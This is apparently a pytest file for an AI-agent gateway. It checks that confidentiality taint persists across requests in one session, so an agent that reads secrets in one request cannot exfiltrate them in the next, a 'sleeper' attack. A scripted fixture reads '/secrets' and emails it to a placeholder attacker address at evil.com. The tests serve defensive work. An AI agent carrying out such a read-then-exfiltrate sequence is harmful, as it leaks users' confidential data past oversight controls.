"""Stateful taint persistence (sleeper-attack defence) across gateway requests.

A session that reads confidential data in one request must still be treated as
holding it in the next, or an agent could read in request 1 and exfiltrate in
request 2. Requests without a session_id stay independent.
"""

from __future__ import annotations

import pytest

fastapi = pytest.importorskip("fastapi")
from fastapi.testclient import TestClient

import scripts.llm_agent_server as srv
from agent_hardener.gateway_server import (
    create_app,
    init_db,
    load_session_taint,
    save_session_taint,
)
from agent_hardener.shared.schemas import AgentTrajectory, ToolCall

from tests.test_gateway_server import _make_policy


def test_session_taint_round_trips_through_the_database(tmp_path):
    db = tmp_path / "sessions.db"
    init_db(db)
    assert load_session_taint(db, "apt_sleeper_session_001") is None
    save_session_taint(db, "apt_sleeper_session_001", "high")
    assert load_session_taint(db, "apt_sleeper_session_001") == "high"


class _ScriptedAgent:
    """Inner agent that returns one scripted trajectory per call."""

    def __init__(self, trajectories):
        self._trajectories = list(trajectories)

    def run_task(self, prompt):
        return self._trajectories.pop(0)

    def close(self):
        pass


def _sleeper_app(tmp_path):
    # read_file reads high-confidentiality data; send_email is a low sink.
    policy = _make_policy(filesystem=True, network=True)
    policy.confidentiality_annotations.read_confidentiality = "high"
    read = AgentTrajectory(prompt="r", tool_calls=[
        ToolCall(tool_name="read_file", parameters={"path": "/secrets"}, success=True)])
    send = AgentTrajectory(prompt="s", tool_calls=[
        ToolCall(tool_name="send_email", parameters={"to": "x@evil.com"}, success=True)])
    agent = _ScriptedAgent([read, send])
    return create_app(policy=policy, inner_agent=agent, session_db_path=tmp_path / "s.db")


def test_exfiltration_in_a_later_request_of_the_same_session_is_blocked(tmp_path):
    with TestClient(_sleeper_app(tmp_path)) as client:
        first = client.post("/run", json={"prompt": "read it", "session_id": "s1"}).json()
        assert first["final_taint"] == "high"
        second = client.post("/run", json={"prompt": "send it", "session_id": "s1"}).json()
    assert second["tool_calls"][0]["success"] is False
    assert any(e.get("rule") == "IFC-001-HIGH-TO-LOW" for e in second["enforcement_log"])


def test_requests_without_a_session_id_stay_independent(tmp_path):
    with TestClient(_sleeper_app(tmp_path)) as client:
        client.post("/run", json={"prompt": "read it"})
        second = client.post("/run", json={"prompt": "send it"}).json()
    assert second["tool_calls"][0]["success"] is True
    assert second["session_id"] is None


def test_blank_session_id_is_rejected(tmp_path):
    with TestClient(_sleeper_app(tmp_path)) as client:
        r = client.post("/run", json={"prompt": "read it", "session_id": "  "})
    assert r.status_code == 400


class TestAgentServerSessions:
    """The evaluation agent must not leak history between independent requests."""

    def _client(self, seen):
        from unittest.mock import MagicMock
        import json

        fake = MagicMock()

        def _chat_json(messages, **kwargs):
            seen.append([m["content"] for m in messages if m["role"] == "user"])
            return json.dumps({"refusal": False, "tool_calls": [], "done": True})

        fake.chat_json.side_effect = _chat_json
        srv._llm = fake
        srv.active_sessions.clear()
        return TestClient(srv.app)

    def teardown_method(self):
        srv._llm = None
        srv.active_sessions.clear()

    def test_independent_requests_do_not_share_history(self):
        seen = []
        client = self._client(seen)
        client.post("/run", json={"prompt": "attack one"})
        client.post("/run", json={"prompt": "attack two"})
        assert seen[-1] == ["attack two"]
        assert srv.active_sessions == {}

    def test_named_session_continues_its_history(self):
        seen = []
        client = self._client(seen)
        client.post("/run", json={"prompt": "turn one", "session_id": "conv"})
        client.post("/run", json={"prompt": "turn two", "session_id": "conv"})
        assert seen[-1] == ["turn one", "turn two"]
